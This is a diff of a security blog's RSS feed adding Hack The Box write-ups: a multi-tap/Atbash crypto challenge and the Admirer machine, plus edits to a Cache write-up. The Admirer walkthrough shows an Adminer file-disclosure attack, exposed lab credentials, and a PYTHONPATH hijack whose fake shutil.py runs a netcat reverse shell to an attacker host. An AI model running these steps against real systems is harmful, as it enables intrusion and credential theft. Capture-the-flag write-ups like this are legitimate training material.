@@ -1,4 +1,268 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Dev & Security]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Thu, 22 Oct 2020 08:53:28 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Cache]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/251">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>We start with our usual scanning which finds only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ sudo nmap -sV -sC -A -T4 cache.htb
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Dev & Security]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 3.18</generator><lastBuildDate>Thu, 22 Oct 2020 09:15:08 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Crypto Challenge | Bank Heist]]></title><description><![CDATA[<blockquote>Hint: You get to the scene of a bank heist and find that you have caught one person. Under further analysis of the persons flip phone you see a message that seems suspicious. Can you figure out what the message to put this guy in jail?</blockquote><pre><code>444333 99966688 277733 7773323444664</code></pre>]]></description><link>https://inesmartins.github.io//htb-crypto-challenge/</link><guid isPermaLink="false">5eeba38b1e7da103a083dba9</guid><category><![CDATA[crypto]]></category><category><![CDATA[htb]]></category><category><![CDATA[multitap phone cipher]]></category><category><![CDATA[challenge]]></category><category><![CDATA[ctf]]></category><category><![CDATA[phone keypad]]></category><category><![CDATA[atbash]]></category><category><![CDATA[cryptography]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 09:09:15 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/heist-movies-on-netflix-866x487.jpg" medium="image"/><content:encoded><![CDATA[<blockquote>Hint: You get to the scene of a bank heist and find that you have caught one person. Under further analysis of the persons flip phone you see a message that seems suspicious. Can you figure out what the message to put this guy in jail?</blockquote><pre><code>444333 99966688 277733 7773323444664 84433 22244474433777, 99966688 277733 666552999. 99966688777 777744277733 666333 84433 443344477778 4447777 44466 99966688777 4466688777733. 84433 5533999 8666 84433 55566622255 4447777 22335556669. 4666 8666 727774447777.
+
+47777888 995559888 4555 47777888 44999988 666555997 : 8555444888477744488866888648833369!!</code></pre><img src="https://inesmartins.github.io//content/images/2020/10/heist-movies-on-netflix-866x487.jpg" alt="HTB Crypto Challenge | Bank Heist"><p>The number repetition is a dead giveaway for the <a href="https://en.wikipedia.org/wiki/Multi-tap">Multi-tap Cipher</a>, i.e.: the text you get when you use an older phone to create text messages. Luckily, there's <a href="https://www.dcode.fr/multitap-abc-cipher">an online tool</a> that automatically decodes this:</p><pre><code>IF YOU ARE READING THE CIPHER, YOU ARE OKAY.
+YOUR SHARE OF THE HEIST IS IN YOUR HOUSE.
+THE KEY TO THE LOCK IS BELOW.
+GO TO PARIS.
+GSV XLWV GL GSV HZU OLXP : TLIVGRIVNVMGUFMW!!</code></pre><p>So, it seems there's an additional cipher to crack:</p><pre><code>GSV XLWV GL GSV HZU OLXP : TLIVGRIVNVMGUFMW!!</code></pre><p><a href="https://scwf.dima.ninja/">Solve Crypto with Force!</a><em><strong> </strong></em>is an awesome website that immediately identified the cipher - <a href="https://en.wikipedia.org/wiki/Atbash">Atbash</a>:</p><pre><code>THE CODE TO THE SAF LOCK : GORETIREMENTFUND!!</code></pre><p>So, there's the flag: <code>HTB{GORETIREMENTFUND!!}</code>.</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Admirer]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/248">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>As always, we start with some basic scanning, with tells us that the machine has:</p><ul><li>an <code>FTP</code> service (vsftp) running on port 21;</li><li>an <code>OpenSSH</code> service running on port 22;</li><li>an <code>Apache</code> web server running on port 80:</li></ul><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A admirer.</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-admirer/</link><guid isPermaLink="false">5ede4cc8b6ef324dc7275dc8</guid><category><![CDATA[htb]]></category><category><![CDATA[ftp]]></category><category><![CDATA[adminer]]></category><category><![CDATA[mysql]]></category><category><![CDATA[privesc]]></category><category><![CDATA[python]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 09:07:19 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/admirer.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/10/admirer.png" alt="HTB Write-up | Admirer"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/248">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>As always, we start with some basic scanning, with tells us that the machine has:</p><ul><li>an <code>FTP</code> service (vsftp) running on port 21;</li><li>an <code>OpenSSH</code> service running on port 22;</li><li>an <code>Apache</code> web server running on port 80:</li></ul><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A admirer.htb
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 15:37 WEST
+Nmap scan report for admirer.htb (10.10.10.187)
+Host is up (0.043s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<!--kg-card-end: markdown--><p>The web application is just a very simple image gallery, there's no authentication or anything that immediately stands out, so we start by exploring the disallowed entry (<code>/admin-dir</code>) found during the basic scan.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/main.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><p>We can't directly access the admin-dir directory but the <a href="http://admirer.htb/robots.txt">robots.txt</a> file has a little clue left to us by "waldo":</p><!--kg-card-begin: markdown--><pre><code>User-agent: *
+
+# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
+Disallow: /admin-dir
+</code></pre>
+<!--kg-card-end: markdown--><p>With this small clue, we find 2 files:</p><ul><li><a href="http://admirer.htb/admin-dir/credentials.txt">http://admirer.htb/admin-dir/credentials.txt</a></li></ul><!--kg-card-begin: markdown--><pre><code>[Internal mail account]
+w.cooper@admirer.htb
+fgJr6q#S\W:$P
+
+[FTP account]
+ftpuser
+%n?4Wz}R$tTF7
+
+[Wordpress account]
+admin
+w0rdpr3ss01!
+</code></pre>
+<!--kg-card-end: markdown--><ul><li><a href="http://admirer.htb/admin-dir/contacts.txt">http://admirer.htb/admin-dir/contacts.txt</a>:</li></ul><!--kg-card-begin: markdown--><pre><code>##########
+# admins #
+##########
+# Penny
+Email: p.wise@admirer.htb
+
+##############
+# developers #
+##############
+# Rajesh
+Email: r.nayyar@admirer.htb
+# Amy
+Email: a.bialik@admirer.htb
+# Leonard
+Email: l.galecki@admirer.htb
+
+#############
+# designers #
+#############
+# Howard
+Email: h.helberg@admirer.htb
+# Bernadette
+Email: b.rauch@admirer.htb
+</code></pre>
+<!--kg-card-end: markdown--><p>Let's do a quick roundup of what we have so far:</p><ol><li>A list of users (with first name and email) that all seem to match the names of Big Bang Theory's characters (except Sheldon Cooper who is instead Waldo Cooper);</li><li>Credentials to one email account (w.cooper@admirer.htb);</li><li>Credentials to one FTP account (ftpuser);</li><li>Credentials to one Wordpress account (admin).</li></ol><p>Since we don't yet know of a way to access the email server or the Wordpress account, we try to explore the FTP service:</p><!--kg-card-begin: markdown--><pre><code>$ ftp 10.10.10.187
+
+Connected to 10.10.10.187.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.187:kali): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp&gt; pass
+Passive mode on.
+
+ftp&gt; ls
+227 Entering Passive Mode (10,10,10,187,175,74)
+150 Here comes the directory listing.
+-rw-r--r-- 1 0 0 3405 Dec 02 21:24 dump.sql
+-rw-r--r-- 1 0 0 5270987 Dec 03 21:20 html.tar.gz
+226 Directory send OK.
+
+</code></pre>
+<!--kg-card-end: markdown--><ol><li>The <code>dump.sql</code> file contains a dump of a MariaDB database called <strong>admirerdb</strong>. This DB contains only one table - Items - which includes the images and respective metadata that appear on the site, so nothing too exciting;</li><li>The <code>html.tar.gz</code> includes a bunch of files that look like a backup of the current web application. Here are some of the most noteworthy:</li></ol><h3 id="robots-txt">robots.txt</h3><p>The backup version of the robots.txt file disallows <code>/w4ld0s_s3cr3t_d1r</code> instead of <code>/admin-dir</code>.</p><!--kg-card-begin: markdown--><pre><code>User-agent: *
+This folder contains personal stuff, so no one (not even robots!) should see it - waldo
+Disallow: /w4ld0s_s3cr3t_d1r
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="index-php">index.php</h3><p>Contains the code for the main page of the web application, including some credentials for the admirerdb.</p><!--kg-card-begin: markdown--><pre><code>...
+&lt;div id=&quot;main&quot;&gt;
+&lt;?php
+    $servername = &quot;localhost&quot;;
+    $username = &quot;waldo&quot;;
+    $password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;;
+    $dbname = &quot;admirerdb&quot;;
+
+    // Create connection
+    $conn = new mysqli($servername, $username, $password, $dbname);
+    
+    // Check connection
+    if ($conn-&gt;connect_error) {
+        die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
+    }
+
+    $sql = &quot;SELECT * FROM items&quot;;
+    $result = $conn-&gt;query($sql);
+
+    if ($result-&gt;num_rows &gt; 0) {
+        // output data of each row
+        while($row = $result-&gt;fetch_assoc()) {
+            echo &quot;&lt;article class='thumb'&gt;&quot;;
+            echo &quot;&lt;a href='&quot;.$row[&quot;image_path&quot;].&quot;' class='image'&gt;&lt;img src='&quot;.$row[&quot;thumb_path&quot;].&quot;' alt='' /&gt;&lt;/a&gt;&quot;;
+            echo &quot;&lt;h2&gt;&quot;.$row[&quot;title&quot;].&quot;&lt;/h2&gt;&quot;;
+	    	echo &quot;&lt;p&gt;&quot;.$row[&quot;text&quot;].&quot;&lt;/p&gt;&quot;;
+	    	echo &quot;&lt;/article&gt;&quot;;
+        }
+    } else {
+        echo &quot;0 results&quot;;
+    }
+    $conn-&gt;close();
+?&gt;
+&lt;/div&gt;
+...
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="w4ld0s_s3cr3t_d1r-credentials-txt">w4ld0s_s3cr3t_d1r/credentials.txt</h3><p>There's a credentials.txt file which contains the same credentials as found on <a href="http://admirer.htb/admin-dir/credentials.txt">http://admirer.htb/admin-dir/credentials.txt</a> and one additional cred:</p><!--kg-card-begin: markdown--><pre><code>[Bank Account]
+waldo.11
+Ezy]m27}OREc$
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="utility_scripts-db_admin-php">utility_scripts/db_admin.php</h3><p>There's a small script that handles the connection with the database, which contains some credentials:</p><!--kg-card-begin: markdown--><pre><code>&lt;?php
+    $servername = &quot;localhost&quot;;
+    $username = &quot;waldo&quot;;
+    $password = &quot;Wh3r3_1s_w4ld0?&quot;;
+    
+    // Create connection
+    $conn = new mysqli($servername, $username, $password);
+    
+    // Check connection
+    if ($conn-&gt;connect_error) {
+        die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
+    }
+    echo &quot;Connected successfully&quot;;
+    
+    // TODO: Finish implementing this or find a better open source alternative
+?&gt;
+
+</code></pre>
+<!--kg-card-end: markdown--><p>So, now we have 2 new credentials:</p><ul><li>one for a bank account (waldo.11);</li><li>one for a mySQL database (waldo);</li></ul><p>Going back to the deployed version of the web application, the <a href="http://admirer.htb/w4ld0s_s3cr3t_d1r/contacts.txt">w4ld0s_s3cr3t_d1r</a> doesn't seem to be available anymore, but the <a href="http://10.10.10.187/utility-scripts/">utility_scripts</a> dir does exist.</p><p>Of all the files on the backup, the <a href="http://10.10.10.187/utility-scripts/admin_tasks.php">admin-tasks page</a> is the most interesting. This page allows any user to check very simple info about the system:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2020/06/4.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><p>At this point I was a bit stuck but after reviewing all the previous clues I realised I missed something on the db_admin.php file:</p><pre><code>// TODO: Finish implementing this or find a better open source alternative
+</code></pre><p>After some googling, I realised that the "better open source alternative" to database administration is likely the <a href="https://www.adminer.org/">Adminer</a> tool - the name likeness was a dead giveaway. </p><p>And this brings us to the <a href="http://10.10.10.187/utility-scripts/adminer.php">adminer.php</a> page:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><h2 id="exploiting-adminer">Exploiting Adminer</h2><p>After trying (and failing) to login with all of the credentials previously found, I decided to search for Adminer vulnerabilities. </p><p>Turns out <a href="https://sansec.io/research/adminer-4.6.2-file-disclosure-vulnerability ">Adminer 4.6.2 is vulnerable to a file disclosure vulnerability</a>.</p><p>So I installed and launched an instance of mySQL server on my machine - I chose to do it on macOS since it looked simpler (read <a href="https://www.dev2qa.com/how-to-use-mysql-on-mac/">this</a> for more info):</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/06/mysql.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><p>And then added a new local user that can access my local mySQL server from the admirer.htb host using the password 'password':</p><!--kg-card-begin: markdown--><pre><code>~ /usr/local/mysql/bin/mysql -u root -p
+Enter password:
+...
+
+mysql&gt; create user 'waldo'@'10.10.10.187' IDENTIFIED WITH mysql_native_password  BY 'password';
+Query OK, 0 rows affected (0.01 sec)
+
+mysql&gt; select user, host from mysql.user;
++------------------+--------------+
+| user             | host         |
++------------------+--------------+
+| waldo            | 10.10.10.187 |
+| mysql.infoschema | localhost    |
+| mysql.session    | localhost    |
+| mysql.sys        | localhost    |
+| root             | localhost    |
++------------------+--------------+
+5 rows in set (0.00 sec)
+</code></pre>
+<!--kg-card-end: markdown--><p>In order to get this to work I had to add some additional configuration to my server ('/etc/my.cnf'):</p><!--kg-card-begin: markdown--><pre><code>[mysqld]
+default_authentication_plugin  =  mysql_native_password
+local-infile                   = 1
+</code></pre>
+<!--kg-card-end: markdown--><p>Note that the <a href="https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_local_infile">local-infile</a> variable should be set to true as to allow us to load data from local files into the DB, which we'll need in a following step.</p><p>Once this is done, we can login as our new user from the Adminer client with password 'password'. Note that the server IP should correspond to the IP where you setup the MySQL server and that you need to specify the port if it's not the default (3306).</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-4.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><p>After logging into the system, we can access the SQL interface and can send commands directly to the machine. </p><p><strong>Our goal is to load local files from the admirer.htb machine to a new DB in our local mySQL server. </strong></p><p>So, first things first, we need to create a valid db with a table that will receive the data. Note that this table should have a field that should support big lines of text content.</p><!--kg-card-begin: markdown--><pre><code>mysql&gt; create database test;
+
+mysql&gt; use test;
+Database changed
+
+mysql&gt; create table tt (line varchar(1000));
+Query OK, 0 rows affected (0.01 sec)
+</code></pre>
+<!--kg-card-end: markdown--><p>Also, you need to grant permission for your user to be able to access that data: </p><!--kg-card-begin: markdown--><pre><code>mysql&gt; grant all privileges on test.tt to 'waldo'@'10.10.10.187';
+Query OK, 0 rows affected (0.04 sec)
+</code></pre>
+<!--kg-card-end: markdown--><p>Going back to our SQL interface, the files most likely to contain valid credentials are index.php and db_admin.php, where we previously found outdated DB credentials.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/query.png" class="kg-image" alt="HTB Write-up | Admirer"></figure><p>To see the results we can either access the data directly on the SQL interface or go to our mySQL server and query the data.</p><!--kg-card-begin: markdown--><pre><code>~ select line from test.tt;
+
+...
+$servername = &quot;localhost&quot;;
+$username = &quot;waldo&quot;;
+$password = &quot;&amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;&quot;;
+$dbname = &quot;admirerdb&quot;;
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>Finally, we have credentials for the admirerdb database and as it turns out waldo's SSH credentials:</p><!--kg-card-begin: markdown--><pre><code>ssh waldo@10.10.10.187
+waldo@10.10.10.187's password:
+Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux
+
+The programs included with the Devuan GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Jun  8 21:25:38 2020 from 10.10.14.95
+waldo@admirer:~$ 
+</code></pre>
+<!--kg-card-end: markdown--><h3 id="useful-resources">Useful Resources</h3><ul><li><a href="https://www.dev2qa.com/how-to-use-mysql-on-mac/">https://www.dev2qa.com/how-to-use-mysql-on-mac/</a></li><li><a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a></li><li><a href="https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html">https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html</a></li><li><a href="https://stackoverflow.com/questions/14779104/how-to-allow-remote-connection-to-mysql">https://stackoverflow.com/questions/14779104/how-to-allow-remote-connection-to-mysql</a></li></ul><hr><h2 id="privilege-escalation">Privilege Escalation</h2><p>Now authenticated as waldo, we started by running <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a>, which helped us find some interesting stuff:</p><!--kg-card-begin: markdown--><pre><code>[+] Readable files belonging to root and readable by me but not world readable
+-rwxr----- 1 root admins 198 Dec  2  2019 /opt/scripts/backup.py
+</code></pre>
+<!--kg-card-end: markdown--><p>On the <code>/opt/scripts/</code> directory we find the <code>admin_tasks</code> bash script which is called by the administrative interface we previously saw. </p><p>At first glance there wasn't any obvious way to exploit this script but, as you can see below, there is a "Backup web data" option which executes the <code>backup.py</code> script as root.</p><!--kg-card-begin: markdown--><pre><code>...
+backup_web()
+{
+    if [ &quot;$EUID&quot; -eq 0 ]
+    then
+        echo &quot;Running backup script in the background, it might take a while...&quot;
+        /opt/scripts/backup.py &amp;
+    else
+        echo &quot;Insufficient privileges to perform the selected operation.&quot;
+    fi
+}
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>The <code>backup.py</code> file, on the other hand, imports the <code>make_archive</code> binary from <code>shutil</code>, which we might be able to exploit by changing the path in which the Python script is executed.</p><!--kg-card-begin: markdown--><pre><code>!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+old ftp directory, not used anymore
+dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)
+</code></pre>
+<!--kg-card-end: markdown--><p>So, we need to:</p><ul><li>change the <strong>Python path</strong> to start with a directory that we control, e.g.: /home/waldo/.abc/;</li><li>create a <strong>shutil.py</strong> file inside /home/waldo/.abc/;</li><li>add a <strong>make_archive</strong> function to shutil.py that uses the same signature (3 fields) but instead of archiving the web content returns a shell as root;</li></ul><p>Let's start with our mock shutil.py:</p><!--kg-card-begin: markdown--><pre><code>waldo@admirer:~$ nano /home/waldo/.abc/shutil.py
+
+import os
+
+def make_archive(a, b, c):
+    os.system(&quot;nc [attacker_ip] [attacker_port] -e '/bin/sh'&quot;)
+    
+waldo@admirer:~$ chmod +x /home/waldo/.abc/shutil.py
+</code></pre>
+<!--kg-card-end: markdown--><p>Don't forget to create a listener on the port you specify above:</p><!--kg-card-begin: markdown--><p><code>nc -l [PORT]</code></p>
+<!--kg-card-end: markdown--><p>Now, all we need to do is change the python path on the call for the admin_tasks script:</p><!--kg-card-begin: markdown--><pre><code>waldo@admirer:~$ sudo PYTHONPATH=/home/waldo/.abc/ /opt/scripts/admin_tasks.sh
+
+[sudo] password for waldo: &amp;&lt;h5b~yK3F#{PaPB&amp;dA}{H&gt;
+
+[[[ System Administration Menu ]]]
+1) View system uptime
+2) View logged in users
+3) View crontab
+4) Backup passwd file
+5) Backup shadow file
+6) Backup web data
+7) Backup DB
+8) Quit
+Choose an option: 6
+Running backup script in the background, it might take a while...
+</code></pre>
+<!--kg-card-end: markdown--><p>And we receive a shell as root which allows us to print the root flag!</p><p>Hope you enjoyed it :)</p><p></p><p></p><p></p><p></p><p></p><p></p><p></p><p><br></p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Cache]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/251">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>We start with our usual scanning which finds only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ sudo nmap -sV -sC -A -T4 cache.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 18:</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-cache/</link><guid isPermaLink="false">5ede7316b6ef324dc7275f74</guid><category><![CDATA[htb]]></category><category><![CDATA[linux]]></category><category><![CDATA[cache]]></category><category><![CDATA[memcached]]></category><category><![CDATA[privesc]]></category><category><![CDATA[docker]]></category><category><![CDATA[openemr]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 08:51:40 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/cache.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/10/cache.png" alt="HTB Write-up | Cache"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/251">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>We start with our usual scanning which finds only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> server running on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ sudo nmap -sV -sC -A -T4 cache.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 18:21 WEST
 Nmap scan report for cache.htb (10.10.10.188)
@@ -15,28 +279,17 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Cache
 No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-TRACEROUTE (using port 554/tcp)
-HOP RTT      ADDRESS
-1   41.51 ms 10.10.14.1
-2   41.62 ms cache.htb (10.10.10.188)
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 26.69 seconds
 </code></pre>
-<!--kg-card-end: markdown--><p>The website hosted on cache.htb is very simple: there are only a couple of HTML pages with some text about hacking.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/index.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>There's also a very simple <a href="http://10.10.10.188/login.html">Login page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-2.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>The credentials for this authentication form are hardcoded on a <a href="http://10.10.10.188/jquery/functionality.js">JS file</a>:</p><!--kg-card-begin: markdown--><pre><code>user: ash
+<!--kg-card-end: markdown--><p>The website hosted on <code>cache.htb</code> is very simple: there are only a couple of HTML pages with some text about hacking.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/index.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>There's also a very simple <a href="http://cache.htb/login.html">Login page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-2.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>The credentials for this authentication form are hardcoded on a <a href="http://cache.htb/jquery/functionality.js">JS file</a>:</p><!--kg-card-begin: markdown--><pre><code>user: ash
 password: H@v3_fun
 </code></pre>
-<!--kg-card-end: markdown--><p>Using these credentials on the form we're redirected to the <a href="http://10.10.10.188/net.html">Net page</a>, which doesn't seem to have anything of relevance.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/net.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>The <a href="http://10.10.10.188/author.html">Author page</a>, on the other hand, seems to have some interesting information:</p><pre><code class="language-html">&lt;div class="card"&gt;
+<!--kg-card-end: markdown--><p>Using these credentials on the form we're redirected to the <a href="http://cache.htb/net.html">Net page</a>, which doesn't seem to have anything of relevance.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/net.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>The <a href="http://cache.htb/author.html">Author page</a>, on the other hand, seems to have some interesting information:</p><pre><code class="language-html">&lt;div class="card"&gt;
   &lt;img src="logo1.jpg" alt="John" style="width:100%"&gt;
   &lt;h1&gt;ASH&lt;/h1&gt;
   &lt;p class="title"&gt;CEO &amp; Founder, CACHE&lt;/p&gt;
   &lt;a href="http://cache.htb"&gt;cache.htb&lt;/a&gt;
   &lt;h3&gt;&lt;font color="Grey"&gt;ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author &amp; Creator of Cache. Check out his other projects like Cache:&lt;p&gt; HMS(Hospital Management System)
-&lt;/font&gt;&lt;/h3&gt; </code></pre><p>So, a couple of interesting things:</p><ul><li>the CEO and Founder of CACHE is someone named ASH (also maybe John according to the alt tag);</li><li>ASH is also the creator of another project called HMS;</li></ul><p>I was certain that HMS was an important clue, but wasn't completely sure how to access it. That is until I realised that it's possible to <strong>host multiple domains on the same Apache server </strong>which are accessible only when you navigate to the correct URL. Since our machine isn't available on the Internet, we can display this other website by changing our /etc/hosts configuration:</p><!--kg-card-begin: markdown--><pre><code>10.10.10.188 hms.htb
+&lt;/font&gt;&lt;/h3&gt; </code></pre><p>So, a couple of interesting things:</p><ul><li>the CEO and Founder of CACHE is someone named ASH (also maybe John according to the alt tag);</li><li>ASH is also the creator of another project called HMS;</li></ul><p>I was certain that HMS was an important clue, but wasn't completely sure how to access it. That is until I realised that it's possible to <strong>host multiple domains on the same Apache server </strong>which are accessible only when you navigate to the correct URL. So, in order to display this other website, all we have to do is change our <code>/etc/hosts</code> configuration:</p><!--kg-card-begin: markdown--><pre><code>10.10.10.188 hms.htb
 </code></pre>
 <!--kg-card-end: markdown--><h2 id="exploiting-openemr-vulnerabilities">Exploiting OpenEMR Vulnerabilities</h2><p>When we access <a href="http://hms.htb/">hms.htb</a> we're redirected to a <a href="http://hms.htb/interface/login/login.php?site=default">login page</a> for <a href="https://www.open-emr.org/">OpenEMR</a>, which is an "open source electronic health records and medical practice management solution".</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/login-3.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>Turns out OpenEMR has a lot of well-known vulnerabilities, which are very thoroughly detailed <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">here</a>.</p><p>As indicated on these docs, we can check the <a href="http://hms.htb/admin.php">admin.php</a> file for the exact version of the application:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/vulns.png" class="kg-image" alt="HTB Write-up | Cache"></figure><p>This version is vulnerable to multiple SQL Injection vulnerabilities. There's actually a very good <a href="https://www.youtube.com/watch?time_continue=115&amp;v=DJSQ8Pk_7hc&amp;feature=emb_logo">video tutorial</a> for this exploit, but in very simple terms it works as follows:</p><ol><li>capture the GET request to a <a href="http://hms.htb/portal/add_edit_event_user.php">portal page</a> with <a href="https://portswigger.net/burp">Burp</a> or any other proxy;</li><li>copy that request to a file and then add a parameter (?eid=1) to the URL:</li></ol><!--kg-card-begin: markdown--><pre><code>~ sudo nano openemr.req
 
@@ -100,11 +353,11 @@ luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
 memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
 mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
 </code></pre>
